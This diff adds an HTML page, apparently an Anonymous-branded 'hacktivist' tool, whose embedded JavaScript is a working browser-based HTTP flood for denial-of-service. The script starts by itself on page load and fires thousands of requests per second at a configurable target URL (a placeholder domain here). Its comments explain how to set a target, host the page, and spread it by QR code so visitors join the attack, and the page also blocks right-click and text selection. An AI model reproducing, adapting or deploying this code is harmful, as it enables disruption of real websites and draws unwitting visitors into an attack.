@@ -1,0 +1,193 @@
+<!--Read Me-->
+<!--First you must read this befor, This code for open source to share the #Ops you can build the target by youself.
+remember to make the QR-Code to share to you friends with any method, whatsapp, Facebook, Twitter, etc.<br />
+thx for support to change the world......-->
+<!-- by the following you need to change the target.</br>
+1. make a search with this code, [http://www.example.com/] (there have to part you need to correct) and change the target domain or IP and save as a different HTML file name<br />
+2. copy you code develop to the pastehtml -http://www.pastehtml.com- then save the url after your post.<br />
+3. share the url with you friends or make the QR-Code by online web apps.<br />
+4. have fun keep on the time and call all the legion to make a good show!
+-->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>[#Ops] -- [HACKITVIST]</title>
+<style type="text/css">
+body {
+background: url("http://dl.dropbox.com/u/29637731/H4X0R3D/background.png");
+background-repeat: repeat;
+background-position: right;
+background-attachment: fixed;
+margin-top: 5%;
+margin-bottom: 5%;
+margin-left: 15%;
+margin-right: 15%;
+font-family:"Courier New", Courier, monospace;
+color: #808080;
+}
+fieldset {
+border-style: none;
+margin: 10px;
+}
+p {
+margin: 0;
+}
+input {
+margin: 0;
+background-color: transparent;
+border: none;
+text-align: center;
+font-family:"Courier New", Courier, monospace;
+color: #808080;
+}
+</style>
+<script language="JavaScript">
+<!-- Disable
+function disableselect(e){
+return false
+}
+function reEnable(){
+return true
+}
+//if IE4+
+document.onselectstart=new Function ("return false")
+document.oncontextmenu=new Function ("return false")
+//if NS6
+if (window.sidebar){
+document.onmousedown=disableselect
+document.onclick=reEnable
+}
+//-->
+</script>
+</head>
+<body onLoad="type()">
+<fieldset>
+<div id="title" align="center"><font size="+3" color="#FF0000">[</font><font size="+3"></font><font size="+3" color="#FF0000">#</font><font size="+3">Ops</font><font size="+3" color="#FF0000">]<br /> -- <br />[</font><font size="+3">Dev By Messiah-T</font><font size="+3" color="#FF0000">]</font></div>
+<br>
+<div class="statement" align="center">
+<h3>Anonymous Asian</h3>
+<p>Greeting Citizen Of The World</p>
+<p>We are Anonymous</p><br />
+<p>Begin Anonymous Hackitvist doesn't means you are the hacker or crime</p><br />
+<p>You are join the #Ops to saving the world, that is your choose<br />
+Sure also start up this site for 30min you are joining the following #Ops and the cyber protest.</p><br />
+<p>We Are Legion</p>
+<p>We Do Not Forget</p>
+<p>We Do Not Forgive</p>
+<p>Expect Us</p>
+</div>
+<div id="hive" align="center">
+<font color="#FF0000">[</font>TARGET<font color="#FF0000">]</font><br>
+<input name="target" id="target" size="100" value="http://www.example.com/"><br><br>
+<font color="#FF0000">[</font>REQUESTS<font color="#FF0000">]</font><br>
+<input id="requests" size="100" value="9999"><br><br>
+<font color="#FF0000">[</font>MESSAGE<font color="#FF0000">]</font><br>
+<input id="message" size="100" value="We are Hackitvist"><br><br>
+<font color="#FF0000">[</font>STATUS<font color="#FF0000">]</font><br>
+
+REQUESTS <p id="requested">0</p>
+SUCCEDED <p id="succeeded">0</p>
+FAILED <p id="failed">0</p><br>
+<button id="fire" style="background-color:#000000; border-color: rgb(255, 255, 255); color: rgb(255, 255, 255); display:none;"> STOP! </button><br><br><br>
+</div>
+<script>
+(function () {
+var fireInterval;
+var isFiring = false;
+var currentTime = new Date();
+var lastSuccess = currentTime.getTime();
+
+var requestedNode = document.getElementById("requested"),
+succeededNode = document.getElementById("succeeded"),
+failedNode = document.getElementById("failed"),
+targetNode = document.getElementById("target"),
+fire = document.getElementById("fire"),
+messageNode = document.getElementById("message"),
+requestsNode = document.getElementById("requests"),
+timeoutNode = document.getElementById("timeout");
+
+var target = targetNode.value;
+targetNode.onchange = function () {
+target = this.value;
+};
+
+var requestsHT = {};
+
+var requested = 0,
+succeeded = 0,
+failed = 0;
+
+var makeHttpRequest = function () {
+if ( (currentTime.getTime()-lastSuccess) > 10000) {
+return;
+} else { 
+lastSuccess = currentTime.getTime();
+};
+
+var rID =Number(new Date());
+
+var img = new Image();
+img.onerror = function () { onFail(rID); };
+img.onabort = function () { onFail(rID); };
+img.onload = function () { onSuccess(rID); }; 
+img.setAttribute("src", target + "?id=" + rID + "&msg=" + messageNode.value);
+requestsHT[rID] = img;
+onRequest(rID);
+};
+
+var onRequest = function (rID) {
+requested++;
+requestedNode.innerHTML = requested;
+};
+
+var onComplete = function (rID) {
+delete requestsHT[rID];
+};
+
+var onFail = function (rID) {
+// failedCtr++;
+//failedCtrNode.innerHTML = failedCtr;
+succeeded++; //Seems like the url will always fail it it isn't an image
+succeededNode.innerHTML = succeeded;
+delete requestsHT[rID];
+};
+
+var onSuccess = function (rID) {
+succeeded++;
+succeededNode.innerHTML = succeeded;
+delete requestsHT[rID];
+};
+
+fire.onclick = function () {
+if (isFiring) {
+clearInterval(fireInterval);
+isFiring = false;
+this.innerHTML = "FIRE!";
+} else {
+isFiring = true;
+this.innerHTML = "STOP!";
+fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(requestsNode.value) | 0));
+}
+};
+
+function start() {
+if (isFiring) {
+clearInterval(fireInterval);
+isFiring = false;
+this.innerHTML = "FIRE!";
+} else {
+isFiring = true;
+this.innerHTML = "STOP";
+fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(requestsNode.value) | 0));
+}
+};
+document.getElementById("target").value = "http://www.example.com/";
+start();
+})();
+</script>
+<div id="footer" align="center"><font color="#FF0000"># [</font>Anon-T<font color="#FF0000">] -- [</font>ANONYMOUS HACK TEAM<font color="#FF0000"> ] #</font></div>
+
+</fieldset>
+</body>
+</html>
